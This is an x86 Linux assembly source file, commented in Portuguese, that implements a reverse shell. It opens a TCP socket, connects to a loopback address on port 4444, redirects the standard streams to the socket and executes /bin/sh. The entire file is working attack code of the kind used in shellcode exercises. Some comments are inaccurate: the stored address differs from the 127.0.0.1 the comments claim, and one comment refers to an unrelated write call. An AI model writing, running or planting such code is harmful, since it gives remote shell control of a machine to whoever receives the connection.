section .text
    global _start

section .bss
    sockfd: resb 4
    
    struc sockaddr_in
    .family:  resw  1
    .port:    resw  1
    .addr:    resd  1
              resq  1
    endstruc

section .data
    sin:
    istruc sockaddr_in
        at sockaddr_in.family, dw AF_INET
        at sockaddr_in.port, dw 0x5c11        ; htons(4444)
        at sockaddr_in.addr, dd 0x0101017f    ; htonl(0x7f010101)
        ; Itens não inicializados são automaticamente zerados pelo NASM.
    iend

_start:
    ; void write(1, welcome, strlen(welcome));
    sys_connect equ 0x16a
    sys_socket  equ 0x167
    sys_execve  equ 0xb
    sys_dup2    equ 0x3f

    AF_INET equ 2


    socket:
        ; (INT) eax = socket(AF_INET, SOCK_STREAM, 0);
        mov eax, sys_socket ; 359
        mov ebx, 0x2 ; DOMAIN:    AF_INET
        mov ecx, 0x1 ; TYPE:      SOCK_STREAM
        mov edx, 0x0 ; PROTOCOL:  IP
        int 0x80

        mov [sockfd], eax

        ; Jump if eax = -1 -> socket error
        ;test eax, eax
        ;jl socket_err
        
        ; save socket
    connect:
        ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        mov eax, sys_connect            ; syscall connect
        mov ebx, [sockfd]              ; sockfd
        
        ;mov word  [sockaddr_in],   0x2        ; sin_family -> AF_INET (0x2) 
        ;mov word  [sockaddr_in+2], 0x5c11     ; sin_port   -> 4444    (0x5C11)
        ;mov dword [sockaddr_in+4], 0x0101017f ; sin_addr.s_addr -> 127.0.0.1 (0x0101017f)
                                              ; sin_zero[8] preenchimento padrão.

        mov ecx, sin ; (struct sockaddr *)&sockaddr_in
        mov edx, sockaddr_in_size          ; 16 bytes
        int 0x80

        xor esi, esi

    dup2:
        ;void dup2(int newfd, int oldfd)
        mov eax, sys_dup2
        mov ebx, [sockfd] 
        mov ecx, esi
        int 0x80
    
        inc esi
        cmp esi, 3
        jne dup2

    execve:
        mov eax, sys_execve ; execve

        xor edx, edx          ; argv
        xor ecx, ecx          ; envp

        push edx        ; NULL BYTE
        push dword 0x68732f2f ; //sh
        push dword 0x6e69622f ; /bin
        
        mov ebx, esp          ; filename
        int 0x80


    ; exit EXIT_SUCCESS;
    mov eax, 1
    mov ebx, 0
    int 0x80
